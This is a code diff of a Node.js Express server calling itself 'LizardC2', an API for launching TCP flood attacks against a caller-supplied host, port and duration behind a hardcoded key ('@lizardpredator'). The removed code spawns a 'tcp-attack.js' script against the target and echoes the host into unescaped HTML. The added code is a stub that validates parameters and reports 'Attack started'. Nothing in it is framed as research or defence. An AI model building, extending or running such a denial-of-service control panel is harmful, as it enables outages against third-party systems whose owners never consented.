@@ -1,64 +1,31 @@
 const express = require('express');
-
 const app = express();
 const port = 8080;
 
+// Middleware to parse JSON bodies
+app.use(express.json());
+
 const key = "@lizardpredator";
 
-app.get('/api/attack', (req, res) => {
+// Endpoint untuk memulai serangan
+app.post('/api/start-attack', (req, res) => {
   try {
-    const keyFromQuery = req.query.key;
-    const host = req.query.host;
-    const time = parseInt(req.query.time, 10);
-    const method = req.query.method;
+    const { keyFromQuery, host, port, time, method } = req.body;
 
     if (keyFromQuery !== key) {
       return res.status(401).send('Key not working');
     }
 
-    if (!host || isNaN(time) || method !== 'TCP-ATTACK') {
+    if (!host || isNaN(port) || isNaN(time) || method !== 'TCP') {
       return res.status(400).send('Invalid parameters or method');
     }
 
-    // Only handle the TCP-ATTACK method
-    if (method === 'TCP-ATTACK') {
-      const spawn = require('child_process').spawn;
-      const args = [host, time, '1', '1']; // Updated arguments
+    console.log(`Starting attack on ${host}:${port} for ${time}ms using method ${method}`);
 
-      const child = spawn('node', ['tcp-attack.js', ...args]);
+    // Logika untuk memulai serangan bisa ditambahkan di sini
 
-      child.stdout.on('data', (data) => {
-        console.log(`stdout: ${data}`);
-      });
-
-      child.stderr.on('data', (data) => {
-        console.error(`stderr: ${data}`);
-      });
-
-      child.on('close', (code) => {
-        console.log(`child process exited with code ${code}`);
-        if (code === 0) {
-          const html = `
-            <html>
-              <body>
-                <h1>Lizard Api</h1>
-                <p>Host: ${host}</p>
-                <p>Time: ${time}</p>
-                <p>Method: ${method}</p>
-              </body>
-            </html>
-          `;
-          res.send(html);
-        } else {
-          res.status(500).send('An error occurred during process execution');
-        }
-      });
-
-      child.on('error', (err) => {
-        console.error('Failed to start subprocess:', err);
-        res.status(500).send('Failed to start subprocess');
-      });
-    }
+    // Respon berhasil
+    res.status(200).send(`Attack started on ${host}:${port} for ${time}ms`);
   } catch (error) {
     console.error(error);
     res.status(500).send('There was a problem.');
@@ -66,5 +33,5 @@ app.get('/api/attack', (req, res) => {
 });
 
 app.listen(port, () => {
-  console.log(`API LizardC2 Started To: ${port} port`);
+  console.log(`API LizardC2 Started on port ${port}`);
 });
